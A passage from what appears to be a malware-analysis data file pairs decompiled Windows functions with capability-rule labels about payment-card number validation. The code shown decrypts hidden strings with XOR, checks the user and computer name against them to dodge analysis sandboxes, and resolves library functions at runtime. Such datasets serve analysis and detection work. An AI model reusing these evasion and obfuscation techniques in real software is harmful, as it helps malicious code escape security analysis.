0x44;\n    var_8h = 0x30656e5a;\n    var_4h = CONCAT22(var_4h._2_2_, 0x4438);\n    uVar5 = (*pcVar2)(8, 0xd);\n    iVar13 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    var_54h = 6;\n    iVar6 = 0;\n    var_74h = iVar13;\n    var_40h = &var_20h - iVar13;\n    do {\n        iVar7 = (*_sym.imp.USER32.dll_GetOpenClipboardWindow)();\n        if (iVar7 != 0x647316) {\n            *(iVar6 + iVar13) = *(&var_8h + iVar6 % var_54h) ^ (iVar6 + iVar13)[&var_20h - iVar13];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0xc);\n    iVar13 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar13);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar13 != 0) {\n        fcn.0040a973();\n    }\n    pcbBuffer = 0x400;\n    iVar13 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(0x41cdf0, &pcbBuffer);\n    if (iVar13 == 0) {\n        fcn.0040a973();\n    }\n    var_20h._0_1_ = 4;\n    var_20h._1_1_ = 0x3b;\n    var_20h._2_1_ = 10;\n    var_20h._3_1_ = 0x11;\n    var_1ch._0_1_ = 0x2c;\n    var_1ch._1_1_ = 0x29;\n    var_1ch._2_2_ = 0x2d3a;\n    var_18h._0_1_ = 0x10;\n    var_18h._1_1_ = 0x2c;\n    var_18h._2_1_ = 0x35;\n    var_18h._3_1_ = 0x4e;\n    var_6ch = 0x63784e47;\n    var_68h._0_1_ = 0x49;\n    uVar5 = (*pcVar2)(8, 0xd);\n    iVar13 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar6 = 0;\n    var_40h = &var_20h - iVar13;\n    do {\n        iVar7 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n        if (iVar7 != 0x6ac40f) {\n            *(iVar6 + iVar13) = *(&var_6ch + iVar6 % var_50h) ^ (iVar6 + iVar13)[&var_20h - iVar13];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0xc);\n    iVar6 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x41cdf0, iVar13);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar6 == 0) {\n        fcn.0040a973();\n    }\n    var_84h = 0x293e2e36;\n    var_80h = 0x4f1d1f21;\n    var_8h = 0x4d504f65;\n    var_4h = CONCAT22(var_4h._2_2_, 0x7043);\n    uVar5 = (*pcVar2)(8, 9);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_6ch = iVar6;\n    var_40h = &var_84h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetFocus)();\n        if (iVar8 != 0x816a73) {\n            *(iVar7 + iVar6) = *(&var_8h + iVar7 % var_54h) ^ (iVar7 + iVar6)[&var_84h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 8);\n    iVar6 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x41cdf0, iVar6);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar6 == 0) {\n        fcn.0040a973();\n    }\n    pcbBuffer = 0x400;\n    iVar6 = (*_sym.imp.KERNEL32.dll_GetComputerNameA)(0x41cdf0, &pcbBuffer);\n    if (iVar6 == 0) {\n        fcn.0040a973();\n    }\n    var_7ch = 0x360d7616;\n    var_78h = 0x371d0123;\n    var_8h = 0x72433745;\n    var_4h = CONCAT22(var_4h._2_2_, 0x4e61);\n    uVar5 = (*pcVar2)(8, 9);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_80h = iVar6;\n    var_40h = &var_7ch - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetCursor)();\n        if (iVar8 != 0xf028c) {\n            *(iVar7 + iVar6) = *(&var_8h + iVar7 % var_54h) ^ (iVar7 + iVar6)[&var_7ch - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 8);\n    iVar6 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x41cdf0, iVar6);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar6 == 0) {\n        fcn.0040a973();\n    }\n    var_8h = 0x1d380944;\n    var_4h = 0x711b3a1b;\n    var_10h = 0x51715a73;\n    var_ch._0_1_ = 0x4d;\n    uVar5 = (*pcVar2)(8, 9);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_78h = iVar6;\n    var_40h = &var_8h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetMenuCheckMarkDimensions)();\n        if (iVar8 != 0xc3112c) {\n            *(iVar7 + iVar6) = *(&var_10h + iVar7 % var_50h) ^ (iVar7 + iVar6)[&var_8h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 8);\n    iVar6 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x41cdf0, iVar6);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar6 == 0) {\n        fcn.0040a973();\n    }\n    var_30h = 0xa631427;\n    var_2ch = 0x74072e02;\n    var_28h._0_1_ = 0x12;\n    var_28h._1_1_ = 0x11;\n    var_28h._2_1_ = 0x2a;\n    var_28h._3_1_ = 6;\n    var_24h = 0x3f1c1c72;\n    var_20h._0_1_ = 1;\n    var_20h._1_1_ = 0x78;\n    var_20h._2_1_ = 1;\n    var_20h._3_1_ = 0x1b;\n    var_1ch._0_1_ = 0x33;\n    var_1ch._2_2_ = 0x3d48;\n    var_18h._0_1_ = 0x21;\n    var_18h._1_1_ = 10;\n    var_18h._2_1_ = 0x38;\n    var_18h._3_1_ = 0x31;\n    var_10h = 0x4e31556f;\n    var_ch._0_1_ = 0x55;\n    var_1ch._1_1_ = var_28h._3_1_;\n    uVar5 = (*pcVar2)(8, 0x1d);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_40h = &var_30h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n        if (iVar8 != 0xb961c8) {\n            *(iVar7 + iVar6) = *(&var_10h + iVar7 % var_50h) ^ (iVar7 + iVar6)[&var_30h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x1c);\n    var_24h = 0xc2a1b64;\n    var_20h._0_1_ = 0x1f;\n    var_20h._1_1_ = 7;\n    var_20h._2_1_ = 0x75;\n    var_20h._3_1_ = 0xb;\n    var_1ch._0_1_ = 0x36;\n    var_1ch._1_1_ = 0xb;\n    var_1ch._2_2_ = 0xf2c;\n    var_18h._0_1_ = 0x45;\n    var_18h._1_1_ = 0x11;\n    var_18h._2_1_ = 0x30;\n    var_18h._3_1_ = 0x17;\n    var_14h = 0x6a14;\n    var_8h = 0x78596237;\n    var_4h = CONCAT22(var_4h._2_2_, 0x6a7a);\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x13);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar8 = 0;\n    var_a0h = &var_24h - iVar7;\n    var_40h = iVar7;\n    do {\n        iVar9 = (*_sym.imp.USER32.dll_GetClipboardOwner)();\n        puVar11 = extraout_ECX;\n        if (iVar9 != 0xba4324) {\n            puVar11 = iVar8 + iVar7;\n            *puVar11 = *(&var_8h + iVar8 % var_54h) ^ puVar11[&var_24h - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x12);\n    cVar3 = fcn.0040a77c(puVar11, puVar11);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (cVar3 == '\\0') {\n        fcn.0040a973();\n    }\n    var_10h = 0x4c3b3476;\n    var_ch._0_1_ = 0x35;\n    var_4ch = 0x6c727937;\n    var_48h._0_1_ = 0x35;\n    uVar5 = (*pcVar2)(8, 6);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar8 = 0;\n    var_a0h = iVar7;\n    var_9ch = &var_10h - iVar7;\n    do {\n        iVar9 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar9 != 0xa5afe7) {\n            *(iVar8 + iVar7) = *(&var_4ch + iVar8 % var_50h) ^ (iVar8 + iVar7)[&var_10h - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 5);\n    var_8h = 0xb217712;\n    var_4h = CONCAT22(var_4h._2_2_, 0x5062);\n    var_10h = 0x43623850;\n    var_ch._0_1_ = 0x31;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 7);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar8 = 0;\n    var_9ch = iVar7;\n    var_98h = &var_8h - iVar7;\n    do {\n        iVar9 = (*_sym.imp.USER32.dll_CountClipboardFormats)();\n        if (iVar9 != 0x6b0c26) {\n            *(iVar8 + iVar7) = *(&var_10h + iVar8 % var_50h) ^ (iVar8 + iVar7)[&var_8h - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 6);\n    var_10h = 0x217d2561;\n    var_ch._0_1_ = 0x66;\n    var_4ch = 0x79326737;\n    var_48h._0_1_ = 0x66;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 6);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar8 = 0;\n    var_98h = iVar7;\n    var_94h = &var_10h - iVar7;\n    do {\n        iVar9 = (*_sym.imp.USER32.dll_GetFocus)();\n        if (iVar9 != 0x279e51) {\n            *(iVar8 + iVar7) = *(&var_4ch + iVar8 % var_50h) ^ (iVar8 + iVar7)[&var_10h - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 5);\n    var_10h = 0x3b0b60;\n    var_ch._0_1_ = 0x78;\n    var_8h = 0x55764e31;\n    var_4h = CONCAT22(var_4h._2_2_, 0x6478);\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 6);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar8 = 0;\n    var_94h = iVar7;\n    var_90h = &var_10h - iVar7;\n    do {\n        iVar9 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n        if (iVar9 != 0xdacb4) {\n            *(iVar8 + iVar7) = *(&var_8h + iVar8 % var_54h) ^ (iVar8 + iVar7)[&var_10h - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 5);\n    var_10h = 0x192f2a67;\n    var_ch._0_1_ = 0x72;\n    var_8h = 0x506c6734;\n    var_4h = CONCAT22(var_4h._2_2_, 0x5272);\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 6);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar8 = 0;\n    var_90h = iVar7;\n    var_8ch = &var_10h - iVar7;\n    do {\n        iVar9 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        if (iVar9 != 0xd5702d) {\n            *(iVar8 + iVar7) = *(&var_8h + iVar8 % var_54h) ^ (iVar8 + iVar7)[&var_10h - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 5);\n    var_24h = 0x2f252a7b;\n    var_20h._0_1_ = 0x34;\n    var_20h._1_1_ = 0x18;\n    var_20h._2_1_ = 0x12;\n    var_20h._3_1_ = 0x49;\n    var_1ch._0_1_ = 0x51;\n    var_1ch._1_1_ = 0x5c;\n    var_1ch._2_2_ = 0xc48;\n    var_18h._0_1_ = 2;\n    var_18h._1_1_ = 0x54;\n    var_18h._2_1_ = 0x41;\n    var_18h._3_1_ = 0x5a;\n    var_14h = CONCAT11(var_14h._1_1_, 0x78);\n    var_8h = 0x6a716432;\n    var_4h = CONCAT22(var_4h._2_2_, 0x3878);\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x12);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar8 = 0;\n    var_8ch = iVar7;\n    var_88h = &var_24h - iVar7;\n    do {\n        iVar9 = (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n        if (iVar9 != 0x407c0a) {\n            *(iVar8 + iVar7) = *(&var_8h + iVar8 % var_54h) ^ (iVar8 + iVar7)[&var_24h - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x11);\n    var_8h = 0x1c073b3c;\n    var_4h = var_4h & 0xff000000 | 0x6f4b63;\n    var_10h = 0x48496f7a;\n    var_ch._0_1_ = 0x4e;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 8);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar8 = 0;\n    var_88h = iVar7;\n    var_44h = &var_8h - iVar7;\n    do {\n        iVar9 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n        if (iVar9 != 0xa08dd) {\n            *(iVar8 + iVar7) = *(&var_10h + iVar8 % var_50h) ^ (iVar8 + iVar7)[&var_8h - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 7);\n    var_4ch = 0x7d0c1c30;\n    var_48h._0_1_ = 0x38;\n    var_8h = 0x34425363;\n    var_4h = CONCAT22(var_4h._2_2_, 19000);\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 6);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar8 = 0;\n    var_44h = &var_4ch - iVar7;\n    var_10h = iVar7;\n    do {\n        iVar9 = (*_sym.imp.USER32.dll_GetCapture)();\n        if (iVar9 != 0x169b85) {\n            *(iVar8 + iVar7) = *(&var_8h + iVar8 % var_54h) ^ (iVar8 + iVar7)[&var_4ch - iVar7];\n        }\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 5);\n    *0x41d200 = var_a0h;\n    *0x41d208 = var_9ch;\n    *0x41d20c = var_98h;\n    *0x41d210 = var_94h;\n    *0x41d214 = var_90h;\n    uVar12 = 0;\n    *0x41d218 = var_8ch;\n    *0x41d21c = var_88h;\n    *0x41d220 = iVar7;\n    do {\n        iVar7 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41cdf0, *(uVar12 + 0x41d200));\n        if (iVar7 != 0) {\n            fcn.0040a973();\n        }\n        uVar12 = uVar12 + 4;\n    } while (uVar12 < 0x20);\n    var_24h = 0x5c073c6e;\n    var_20h._0_1_ = 0x2e;\n    var_20h._1_1_ = 0x7a;\n    var_20h._2_1_ = 0x3c;\n    var_20h._3_1_ = 0xc;\n    var_1ch._0_1_ = 0x4a;\n    var_1ch._1_1_ = 0x17;\n    var_1ch._2_2_ = 0x275d;\n    var_18h._0_1_ = 0x10;\n    var_18h._1_1_ = 0x50;\n    var_18h._2_1_ = 0x2e;\n    var_18h._3_1_ = 0x56;\n    var_14h = CONCAT11(var_14h._1_1_, 0x55);\n    var_64h = 0x39635538;\n    var_60h._0_1_ = 0x41;\n    uVar5 = (*pcVar2)(8, 0x12);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar8 = 0;\n    var_4ch = iVar7;\n    var_44h = &var_24h - iVar7;\n    do {\n        iVar9 = (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n        puVar11 = extraout_ECX_00;\n        if (iVar9 != 0x47255) {\n            puVar11 = iVar8 + iVar7;\n            *puVar11 = *(&var_64h + iVar8 % var_50h) ^ puVar11[&var_24h - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x11);\n    cVar3 = fcn.0040a77c(puVar11, puVar11);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (cVar3 == '\\0') {\n        fcn.0040a973();\n    }\n    var_20h._0_1_ = 0xc;\n    var_20h._1_1_ = 3;\n    var_20h._2_1_ = 0x1b;\n    var_20h._3_1_ = 0x3d;\n    var_1ch._0_1_ = 0x3b;\n    var_1ch._1_1_ = 0x3b;\n    var_1ch._2_2_ = 0x2836;\n    var_18h._0_1_ = 6;\n    var_18h._1_1_ = 0x31;\n    var_18h._2_1_ = 0x4e;\n    var_8h = 0x49696a5a;\n    var_4h = CONCAT22(var_4h._2_2_, 0x5a4e);\n    uVar5 = (*pcVar2)(8, 0xc);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar8 = 0;\n    var_64h = iVar7;\n    var_44h = &var_20h - iVar7;\n    do {\n        iVar9 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        if (iVar9 != 0xaf37fa) {\n            *(iVar8 + iVar7) = *(&var_8h + iVar8 % var_54h) ^ (iVar8 + iVar7)[&var_20h - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0xb);\n    iVar7 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41cdf0, iVar7);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar7 != 0) {\n        fcn.0040a973();\n    }\n    var_20h._0_1_ = 5;\n    var_3ch = 0x242d3c0b;\n    var_38h = 0x2e21193e;\n    var_34h = 0x1031242c;\n    var_30h = 0x371a1f19;\n    var_2ch = 0x3e2c1f15;\n    var_28h._0_1_ = 0x31;\n    var_28h._1_1_ = 0x1d;\n    var_28h._2_1_ = 0xf;\n    var_28h._3_1_ = 0x1f;\n    var_24h = 0x282f2b1e;\n    var_20h._1_1_ = 0x1b;\n    var_20h._2_1_ = 0x2a;\n    var_20h._3_1_ = 0x16;\n    var_1ch._1_1_ = 4;\n    var_1ch._2_2_ = 0x3d3f;\n    var_18h._0_1_ = 1;\n    var_18h._1_1_ = 0x18;\n    var_18h._2_1_ = 0x19;\n    var_18h._3_1_ = 6;\n    var_14h = 0x7336;\n    var_5ch = 0x706b7358;\n    var_58h._0_1_ = 0x69;\n    var_1ch._0_1_ = var_20h;\n    uVar5 = (*pcVar2)(8, 0x2b);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar8 = 0;\n    var_44h = &var_3ch - iVar7;\n    do {\n        iVar9 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n        puVar11 = extraout_ECX_01;\n        if (iVar9 != 0x69a0ca) {\n            puVar11 = iVar8 + iVar7;\n            *puVar11 = *(&var_5ch + iVar8 % var_50h) ^ puVar11[&var_3ch - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x2a);\n    cVar3 = fcn.0040a77c(puVar11, puVar11);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (cVar3 == '\\0') {\n        fcn.0040a973();\n    }\n    var_2ch = 0x25f6705;\n    var_28h._0_1_ = 0x60;\n    var_28h._1_1_ = 0x1d;\n    var_28h._2_1_ = 100;\n    var_28h._3_1_ = 0x59;\n    var_24h = 0x64027905;\n    var_20h._0_1_ = 0x5a;\n    var_20h._1_1_ = 6;\n    var_20h._2_1_ = 100;\n    var_1ch._0_1_ = 0x66;\n    var_1ch._1_1_ = 0x40;\n    var_1ch._2_2_ = 0x6707;\n    var_18h._0_1_ = 9;\n    var_18h._1_1_ = 0x67;\n    var_18h._2_1_ = 0x5d;\n    var_18h._3_1_ = 0x35;\n    var_8h = 0x356d5230;\n    var_4h = CONCAT31(var_4h._1_3_, 0x54);\n    var_20h._3_1_ = var_20h._1_1_;\n    uVar5 = (*pcVar2)(8, 0x19);\n    iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar9 = 0;\n    var_5ch = iVar8;\n    var_44h = &var_2ch - iVar8;\n    do {\n        iVar10 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n        if (iVar10 != 0x1dcc19) {\n            *(iVar9 + iVar8) = *(&var_8h + iVar9 % var_50h) ^ (iVar9 + iVar8)[&var_2ch - iVar8];\n        }\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 0x18);\n    iVar8 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41cdf0, iVar8);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar8 != 0) {\n        fcn.0040a973();\n    }\n    var_2ch = 0xd010772;\n    var_28h._0_1_ = 0x75;\n    var_28h._1_1_ = 0x41;\n    var_28h._2_1_ = 0x73;\n    var_28h._3_1_ = 5;\n    var_24h = 0x5d711801;\n    var_20h._0_1_ = 0x72;\n    var_20h._1_1_ = 6;\n    var_1ch._0_1_ = 0x75;\n    var_1ch._1_1_ = 0x41;\n    var_1ch._2_2_ = 0x277;\n    var_18h._0_1_ = 0;\n    var_18h._1_1_ = 4;\n    var_18h._2_1_ = 0x72;\n    var_18h._3_1_ = 0x6c;\n    var_8h = 0x35353145;\n    var_4h = CONCAT22(var_4h._2_2_, 0x6c42);\n    var_20h._2_1_ = var_28h._3_1_;\n    var_20h._3_1_ = var_20h._1_1_;\n    uVar5 = (*pcVar2)(8, 0x19);\n    iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar9 = 0;\n    var_50h = iVar8;\n    var_44h = &var_2ch - iVar8;\n    do {\n        iVar10 = (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n        if (iVar10 != 0x5e61a1) {\n            *(iVar9 + iVar8) = *(&var_8h + iVar9 % var_54h) ^ (iVar9 + iVar8)[&var_2ch - iVar8];\n        }\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 0x18);\n    iVar8 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41cdf0, iVar8);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar8 != 0) {\n        fcn.0040a973();\n    }\n    var_2ch = 0x6904414e;\n    var_28h._0_1_ = 0x73;\n    var_28h._1_1_ = 0x15;\n    var_28h._2_1_ = 0x4a;\n    var_28h._3_1_ = 0x44;\n    var_24h = 0xc7c7c07;\n    var_20h._0_1_ = 0x4b;\n    var_20h._1_1_ = 0x4e;\n    var_20h._2_1_ = 9;\n    var_20h._3_1_ = 100;\n    var_1ch._0_1_ = 0x71;\n    var_1ch._1_1_ = 0x15;\n    var_1ch._2_2_ = 0x454b;\n    var_18h._0_1_ = 6;\n    var_18h._1_1_ = 0x60;\n    var_18h._2_1_ = 0x70;\n    var_18h._3_1_ = 0x38;\n    var_8h = 0x51307779;\n    var_4h = CONCAT22(var_4h._2_2_, 0x3844);\n    uVar5 = (*pcVar2)(8, 0x19);\n    iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar9 = 0;\n    var_44h = &var_2ch - iVar8;\n    do {\n        iVar10 = (*_sym.imp.USER32.dll_GetMenuCheckMarkDimensions)();\n        if (iVar10 != 0x965c72) {\n            *(iVar9 + iVar8) = *(&var_8h + iVar9 % var_54h) ^ (iVar9 + iVar8)[&var_2ch - iVar8];\n        }\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 0x18);\n    iVar10 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41cdf0, iVar8);\n    iVar9 = var_50h;\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar10 != 0) {\n        fcn.0040a973();\n    }\n    uVar5 = (*pcVar2)(0, iVar8);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    uVar5 = (*pcVar2)(0, iVar9);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_5ch);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, iVar7);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_64h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_4ch);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_10h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_88h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_8ch);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_90h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_94h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_98h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_9ch);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_a0h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_40h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, iVar6);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_78h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_80h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_6ch);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, iVar13);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_74h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, iVar4);\n    uVar12 = (*pcVar1)(uVar5);\n    return uVar12 & 0xffffff00;\n}\n",
        "token_count": 9778
    },
    "0040a4dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0040a4dc(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t lpLibFileName;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_24h = 0x1c2338;\n    var_20h = 0x58743028;\n    var_1ch._0_2_ = CONCAT11(var_1ch._1_1_, 0x61);\n    var_18h = 0x616a4759;\n    var_14h._0_1_ = 0x58;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 10);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    var_4h = 5;\n    iVar6 = 0;\n    lpLibFileName = iVar2;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetMessagePos)();\n        if (iVar3 != 0xdd6daf) {\n            *(iVar6 + iVar2) = *(&var_18h + iVar6 % var_4h) ^ (iVar6 + iVar2)[&var_24h - iVar2];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 9);\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (*0x41cd1c == NULL) {\n        var_2ch = 0x112d26;\n        var_28h = 0x1712181c;\n        var_24h = 0x3d011a1a;\n        var_20h = 0x46491a0d;\n        var_1ch._0_2_ = 0x6262;\n        var_18h = 0x74625475;\n        var_14h._0_1_ = 0x79;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x13);\n        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        iVar3 = 0;\n        var_ch = &var_2ch - iVar6;\n        do {\n            iVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n            iVar2 = lpLibFileName;\n            if (iVar4 != 0x98e939) {\n                *(iVar3 + iVar6) = *(&var_18h + iVar3 % var_4h) ^ (iVar3 + iVar6)[&var_2ch - iVar6];\n            }\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < 0x12);\n        uVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar6);\n        *0x41cd1c = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n        pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    }\n    (**0x41cd1c)(&var_8h, 4);\n    if (var_8h < 0) {\n        var_8h = -var_8h;\n    }\n    iVar6 = var_8h;\n    uVar1 = (*pcVar5)(0, iVar2);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    return iVar6;\n}\n",
        "token_count": 892
    },
    "0040e684": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
